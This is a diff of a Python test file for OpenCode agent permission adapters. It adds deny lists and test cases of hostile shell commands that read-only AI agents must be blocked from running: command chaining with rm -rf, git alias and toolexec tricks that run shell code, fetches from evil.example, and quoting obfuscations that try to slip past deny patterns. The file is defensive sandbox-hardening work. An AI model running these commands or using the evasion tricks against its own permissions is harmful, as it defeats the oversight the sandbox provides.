@@ -121,7 +121,7 @@ check("emit -> parse preserves values and key order", not bad, bad)
 check("numbers and booleans emitted unquoted", emit_yaml({"t": "0.1", "s": "false"}) == "t: 0.1\ns: false")
 
 print("test_adapters: source validation")
-check("source loads", len(src.agents) == 8 and len(src.commands) == 6 and len(src.skills) >= 17,
+check("source loads", len(src.agents) == 8 and len(src.commands) == 7 and len(src.skills) >= 17,
       (len(src.agents), len(src.commands), len(src.skills)))
 check("exactly one primary agent (lead)", [a.name for a in src.primary()] == ["lead"])
 check("no editor-specific keys at top level",
@@ -190,7 +190,7 @@ check("all expected skills present",
       {"simplify", "memory-hygiene", "skill-authoring", "dataviz", "code-review", "testing", "technical-research"}
       <= {s.name for s in src.skills})
 
-print("test_adapters: OpenCode golden (agents/commands vs pre-migration files; skills pass through)")
+print("test_adapters: OpenCode golden (v1 fixtures plus intended deltas; skills pass through)")
 # Intended changes since the fixtures were captured. The golden pins the
 # translated frontmatter (mode, model, permission, request) after applying
 # exactly these edits. The body is asserted to pass through verbatim; prompt
@@ -215,9 +215,115 @@ REVIEW_VERIFY = [
     "cargo test", "cargo check", "cargo clippy",
     "make test", "make check", "make lint", "make build",
     "gh pr checks", "gh pr view*", "gh pr diff*", "gh run list*",
+    "npm run test:*", "npm run check:*", "npm run lint:*", "npm run build:*",
+    "pnpm run test:*", "pnpm run check:*",
+    "yarn run test:*", "yarn run check:*",
+    "bun run test:*", "bun run check:*",
+    "./node_modules/.bin/tsc *", "./node_modules/.bin/eslint *",
+    "./node_modules/.bin/vitest *", "./node_modules/.bin/jest *",
+    "./node_modules/.bin/playwright test *",
+    "node tests/*", "node scripts/check-*",
+    "python3 -m pytest *", "python3 -m unittest *",
+    "go test *", "go vet *",
+    "cargo test *", "cargo check *", "cargo clippy *",
+    "git -C * status *", "git -C * log *", "git -C * show *",
+    "git -C * diff *", "git -C * rev-parse *", "git -C * ls-files *",
 ]
-REVIEW_CONTROL_DENY = ["*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*>*", "*<*",
-                       "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*"]
+REVIEW_CONTROL_DENY = [
+    "go test *-exec*", "go vet *-vettool*", "cargo clippy *--fix*", "cargo test *--config*",
+    "*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*$'*", '*$"*', "*${*", "*$@*", "*>*", "*<*",
+    "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*",
+    "git -C * -c *", "git -C *-c*", "git -c *", "*--output*", "*--ext-diff*",
+    "*eslint *--fix*", "*eslint *--output-file*", "*eslint *--cache-location*",
+    "*jest * -u", "*jest * -u *", "*jest -u", "*jest -u *", "*jest *--updateSnapshot*",
+    "*vitest * -u", "*vitest * -u *", "*vitest -u", "*vitest -u *", "*vitest *--update*",
+    "*playwright test *--update-snapshots*",
+    "*tsc *--outFile*", "*tsc *--outDir*", "*tsc *--tsBuildInfoFile*", "*tsc *--declarationDir*",
+    "python3 -m pytest /*", "python3 -m pytest ../*", "*--junitxml*",
+    "go test *-toolexec*", "cargo test *--manifest-path*",
+    "*--fix*", "*trivy plugin *", "*--generate-default-config*",
+    "* -o *", "* -o/*", "* -o=*", "* -o*", "*--coverprofile*", "*-coverprofile*", "*-cpuprofile*", "*-memprofile*", "*-trace*", "*-outputdir*", "*--junit-xml*",
+    "*--config-env*", "*--exec-path*",
+    'git *--out*"*', "git *--out*'*", 'git *--ext-*"*', "git *--ext-*'*",
+    'git *"-c"*', "git *'-c'*", r"git *\*",
+]
+SECURITY_EXTRA_DENY = [
+    'git -C * -c *',
+    'git -C *-c*',
+    'git -c *',
+    '*--output*',
+    '*--ext-diff*',
+    '*--report-path*',
+    'npm audit *fix*',
+    'semgrep *--config=https*',
+    'semgrep *--config=http*',
+    'semgrep *-o *',
+    'semgrep *-o*',
+    'semgrep *--config *http*',
+    'semgrep *-f *http*',
+    'trivy *-o *',
+    'trivy *--cache-dir*',
+    'gitleaks *-o *',
+    'gitleaks *-r *',
+    'gitleaks *-r*',
+    '*--fix*',
+    'trivy *plugin*install*',
+    'trivy *plugin*uninstall*',
+    'trivy *plugin*update*',
+    '*--generate-default-config*',
+    '* -o *',
+    '* -o/*',
+    '* -o=*',
+    '* -o*',
+    '*--coverprofile*',
+    '*--junit-xml*',
+    '*--config-env*',
+    '*--exec-path*',
+    'git *--out*"*',
+    "git *--out*'*",
+    'git *--ext-*"*',
+    "git *--ext-*'*",
+    'git *"-c"*',
+    "git *'-c'*",
+    'git *\*',
+    'semgrep *--autofix*',
+    'semgrep *-a*',
+    '*--json-output*',
+    '*--sarif-output*',
+    '*--text-output*',
+    '*--emacs-output*',
+    '*--vim-output*',
+    '*--gitlab-sast-output*',
+    'semgrep *install-semgrep-pro*',
+    'semgrep *publish*',
+    'semgrep *ci*',
+    'semgrep *login*',
+    'semgrep *--remote*',
+    'trivy *repo*',
+    'trivy *aws*',
+    'trivy *server*',
+    'trivy *clean*',
+    'trufflehog *git*http*',
+    'trufflehog *git*https*',
+    'gitleaks *install*',
+    'gitleaks *generate*',
+    'semgrep *--generate-config*',
+    'trivy *--config*',
+    'pip-audit *--out*',
+    'osv-scanner *fix*',
+    '*--registry*',
+    '*--index-url*',
+    '*--extra-index-url*',
+    '*--db-repository*',
+    'govulncheck *-db*',
+    '*--diagnostics*',
+    '*--clone-path*',
+    'trivy *--java-db-repository*',
+    'trivy *--checks-bundle-repository*',
+    'trivy *--server*',
+]
+SECURITY_CONTROL_DENY = ["*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*$'*", '*$"*', "*${*", "*$@*", "*>*", "*<*",
+                         "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*"]
 
 
 def no_git_writes(*subs):
@@ -237,8 +343,8 @@ def denies(*keys):
 # asserted to pass through verbatim. Procedure now lives in skills, so the
 # requirement checks below point at the skill each agent must reference.
 REQUIRED_SKILLS = {
-    "lead": ["project-planning", "architecture-analysis", "memory-hygiene", "diagrams"],
-    "builder": ["test-driven-development", "simplify", "verification-before-completion"],
+    "lead": ["project-planning", "architecture-analysis", "memory-hygiene", "diagrams", "work-order"],
+    "builder": ["test-driven-development", "simplify", "verification-before-completion", "work-order"],
     "explorer": ["repository-exploration"],
     "researcher": ["technical-research"],
     "architect": ["architecture-analysis", "diagrams"],
@@ -246,20 +352,38 @@ REQUIRED_SKILLS = {
     "security": ["security-review"],
     "tester": ["testing", "verification-before-completion"],
 }
+READ_ONLY_CONTROL_DENY = ["*;*", "*&&*", "*&*", "*||*", "*|*", "*`*", "*$(*", "*$'*", '*$"*', "*${*", "*$@*", "*>*", "*<*",
+                          "*\n*", "*\r*", "*=(*", "*--textconv*", "*--show-signature*",
+                          "*--output*", "*--ext-diff*",
+                          'git *--out*"*', "git *--out*'*", 'git *--ext-*"*', "git *--ext-*'*",
+                          'git *"-c"*', "git *'-c'*", r"git *\*"]
+
 FIXTURE_DELTAS = {  # 2026-10-10: read-only agents get read-only git in OpenCode too
     "explorer": {"bash_remove": ["git branch *", "git remote *"],
-                 "bash_add": allows(*GIT_BRANCH_READ, *GIT_REMOTE_READ) + no_git_writes("log")},
+                 "bash_add": allows(*GIT_BRANCH_READ, *GIT_REMOTE_READ) + no_git_writes("log")
+                             + denies(*READ_ONLY_CONTROL_DENY)},
     "reviewer": {"bash_remove": ["git branch *"],
                  "bash_add": allows(*GIT_BRANCH_READ, *REVIEW_GIT_READ)
                              + no_git_writes("diff", "log", "show")
-                             + allows(*REVIEW_VERIFY) + denies(*REVIEW_CONTROL_DENY)},
-    "security": {"bash_add": no_git_writes("diff", "log", "show")},
+                             + allows(*REVIEW_VERIFY)
+                             + denies(*REVIEW_CONTROL_DENY)},
+    "security": {"bash_add": allows("semgrep *", "osv-scanner *", "trivy *", "govulncheck *",
+                                    "bundle audit *", "composer audit *",
+                                    "./node_modules/.bin/audit-ci *",
+                                    "git -C * status *", "git -C * log *", "git -C * show *",
+                                    "git -C * diff *", "git -C * rev-parse *", "git -C * ls-files *")
+                             + no_git_writes("diff", "log", "show")
+                             + denies(*SECURITY_EXTRA_DENY)
+                             + denies(*SECURITY_CONTROL_DENY),
+                 "set": {"webfetch": "deny", "websearch": "deny"}},
+    "tester": {"set": {"webfetch": "allow", "websearch": "allow"}},
     "researcher": {"bash_remove": ["git *"],
                    "bash_add": allows("git status *", "git rev-parse *", "git log *", "git show *",
                                       "git diff *", "git ls-files *", "git describe *", "git tag",
                                       "git tag --list *", "git tag -l *", *GIT_BRANCH_READ,
-                                      *GIT_REMOTE_READ) + no_git_writes("diff", "log", "show")},
-    "architect": {"bash_add": no_git_writes("log")},
+                                      *GIT_REMOTE_READ) + no_git_writes("diff", "log", "show")
+                             + denies(*READ_ONLY_CONTROL_DENY)},
+    "architect": {"bash_add": no_git_writes("log") + denies(*READ_ONLY_CONTROL_DENY)},
 }
 
 # 2026-10-21: model_tier resolves to an OpenCode selector. The fixture golden
@@ -325,6 +449,11 @@ def apply_delta(name, fm, problems):
                 problems.append(f"delta for {name}: {k!r} already in fixture")
             bash[k] = v
         fm = dict(fm, permission=dict(fm["permission"], bash=bash))
+    for k, v in d.get("set", {}).items():
+        if k not in fm.get("permission", {}):
+            problems.append(f"delta for {name}: {k!r} not in fixture permission")
+        else:
+            fm = dict(fm, permission=dict(fm["permission"], **{k: v}))
     return fm
 
 
@@ -377,6 +506,26 @@ check("reviewer prompt requires the review packet and cross-boundary pass",
       "Review packet" in by_name["reviewer"].body and "cross-boundary" in by_name["reviewer"].body)
 check("reviewer prompt treats project code as untrusted",
       "not a sandbox" in by_name["reviewer"].body and "untrusted" in by_name["reviewer"].body)
+check("reviewer prompt carries the semantic contract",
+      all(x in by_name["reviewer"].body for x in
+          ["Mandatory semantic passes", "coverage table", "head SHA"]))
+check("tester prompt carries data provenance and copy truth",
+      all(x in by_name["tester"].body for x in ["data provenance", "copy truth"]))
+check("lead work order carries cardinality, copy truth and optional fields",
+      all(x in by_name["lead"].body for x in ["cardinality map", "copy map", "optional-field"]))
+check("builder contract carries optional fields", "Optional fields" in by_name["builder"].body)
+check("work-order skill carries optional fields",
+      "Optional fields" in next(s for s in src.skills if s.name == "work-order").body)
+check("work-order template carries the optional-field row",
+      "Optional fields:" in next(s for s in src.skills if s.name == "work-order").body)
+check("feature command carries the optional-field row",
+      "optional fields" in next(c for c in src.commands if c.name == "feature").body)
+check("merge command queries thread resolution",
+      all(x in next(c for c in src.commands if c.name == "merge").body
+          for x in ["isResolved", "pageInfo", "endCursor", "after", "id "]))
+check("testing skill carries data provenance and copy truth",
+      all(x in next(s for s in src.skills if s.name == "testing").body
+          for x in ["data provenance", "copy truth"]))
 check("code-review skill has the cross-boundary pass",
       "Cross-boundary pass" in next(s for s in src.skills if s.name == "code-review").body)
 check("no current skill uses targets (pass-through below is exercised)", all("targets" not in s.fm for s in src.skills))
@@ -461,7 +610,15 @@ MUTATING_GIT = ["git push", "git push origin main", "git reset --hard", "git cle
                 "git remote set-url origin https://x", "git remote remove origin", "git remote rename origin x",
                 "git tag v9", "git tag -d v1", "git log --output=/tmp/x", "git log -p --output /tmp/x",
                 "git show --output=/tmp/x HEAD", "git diff --output=/tmp/x", "git diff --ext-diff",
-                "git -c alias.x=!sh x", "git -C /tmp push"]
+                "git -c alias.x=!sh x", "git -C /tmp push",
+                "git -C /tmp log --output=/tmp/x", "git -C /tmp diff --output=/tmp/x",
+                "git -C /tmp diff --ext-diff", "git -C /tmp -c diff.external=id diff",
+                "git -C /tmp -ccore.fsmonitor=id status",
+                "git -C /tmp show --output=/tmp/x HEAD",
+                "git status ; rm -rf x", "git diff && rm -rf x",
+                r"git log $'\x2d\x2doutput=/tmp/x'",
+                r"git log --out\put=/tmp/x", 'git log --out"put"=/tmp/x', r"git diff --ext\-diff",
+                r"git log --outp${x:-}ut=/tmp/x", 'git log --outp$"u"t=/tmp/x', "git log --outp$@ut=/tmp/x"]
 READ_ONLY = ["explorer", "reviewer", "security", "researcher", "architect"]
 
 
@@ -545,12 +702,81 @@ REVIEW_DENY = [
     "git diff =(rm -rf x)",
     "git diff --textconv",
     "git log --show-signature",
+    "git -C /tmp diff --output=/tmp/x",
+    "git -C /tmp -c diff.external=id diff",
+    "git -C /tmp -ccore.fsmonitor=id status",
+    "./node_modules/.bin/eslint --fix .",
+    "./node_modules/.bin/eslint --output-file /tmp/x .",
+    "./node_modules/.bin/jest -u",
+    "./node_modules/.bin/tsc --outFile /tmp/x",
+    "python3 -m pytest /tmp/evil.py",
+    "python3 -m pytest ../evil.py",
+    "go test -toolexec='sh -c id' ./...",
+    "go test -o /tmp/x ./...",
+    "go test -coverprofile=/tmp/x ./...",
+    "python3 -m pytest --junit-xml=/tmp/x tests",
+    "./node_modules/.bin/vitest -u",
+    "./node_modules/.bin/eslint --cache-location /tmp/x .",
+    "./node_modules/.bin/tsc --tsBuildInfoFile /tmp/x",
+    "./node_modules/.bin/tsc --declarationDir /tmp/x",
+    r"go test $'\x2d\x2dexec' 'sh -c id' ./...",
+    "cargo test --manifest-path /tmp/evil/Cargo.toml",
+    "gh api repos/o/r/pulls/1/merge --method=PUT",
+    "gh api repos/o/r/pulls/1/reviews -f event=APPROVE",
+    "node scripts/run-migrate.js",
     "bash -n -i -c 'git push'",
     "bash -n --interactive -c 'id'",
     "bash -n -ic 'id'",
 ]
 leaked = [f"reviewer: {c}" for c in REVIEW_DENY if oc_bash(by_name["reviewer"], c) == "allow"]
 check("reviewer cannot install, publish, deploy, merge, or chain commands", not leaked, leaked)
+SECURITY_DENY = ["semgrep --config=auto . ; git push", "gitleaks detect ; curl https://x",
+                 "trivy fs --output=/tmp/x .", "npm audit fix",
+                 "git -C /tmp diff --output=/tmp/x",
+                 "git -C /tmp -c diff.external=id diff",
+    "git -C /tmp -ccore.fsmonitor=id status",
+                 "semgrep --config=https://evil.example .",
+                 "semgrep --config=auto --fix .",
+                 "semgrep --config https://evil.example .",
+                 "semgrep -f https://evil.example .",
+                 "pip-audit --fix",
+                 "pip-audit -o src/app.py",
+                 "trivy plugin install",
+                 "trivy fs -o/tmp/x .",
+                 "gitleaks detect -o /tmp/x",
+                 "pip-audit --out src/app.py",
+                 "osv-scanner fix --non-interactive --strategy=in-place",
+                 "npm audit --registry https://evil.example",
+                 "pip-audit --index-url https://evil.example",
+                 "trivy fs --db-repository https://evil.example .",
+                 "govulncheck -db https://evil.example ./...",
+                 "gitleaks dir . --diagnostics cpu --diagnostics-dir /tmp/x",
+                 "trufflehog git ssh://example/repo --clone-path /tmp/x",
+                 "trivy fs --java-db-repository https://evil.example .",
+                 "trivy fs --checks-bundle-repository https://evil.example .",
+                 "trivy client --server https://evil.example .",
+                 "trivy -q plugin install https://evil.example/plugin",
+                 "semgrep --verbose ci",
+                 "semgrep --verbose publish",
+                 "osv-scanner --verbosity=debug fix --non-interactive --strategy=in-place",
+                 "trufflehog -q git https://evil.example/repo",
+                 "npm audit  fix",
+                 "npm audit --silent fix",
+                 "gitleaks detect -r src/app.py",
+                 "trivy plugin  install",
+                 "trufflehog git  https://evil.example/repo",
+                 "semgrep -o/tmp/x .",
+                 "trivy fs --cache-dir /tmp/x .",
+                 "gitleaks install",
+                 "gitleaks generate config",
+                 "semgrep --generate-config",
+                 "trivy --config .trivy.yaml fs .",
+                 "trivy fs -opackage.json .",
+                 "pip-audit -opackage.json"]
+leaked = [f"security: {c}" for c in SECURITY_DENY if oc_bash(by_name["security"], c) == "allow"]
+check("security cannot chain or write through the expanded scanner access", not leaked, leaked)
+check("researcher cannot write OpenCode config",
+      oc_bash(by_name["researcher"], "opencode mcp add evil --command x") != "allow")
 check("typed golden would catch quoting drift",
       parse_frontmatter("---\nt: 0.1\n---\n", typed=True)[0] != parse_frontmatter('---\nt: "0.1"\n---\n', typed=True)[0])
 
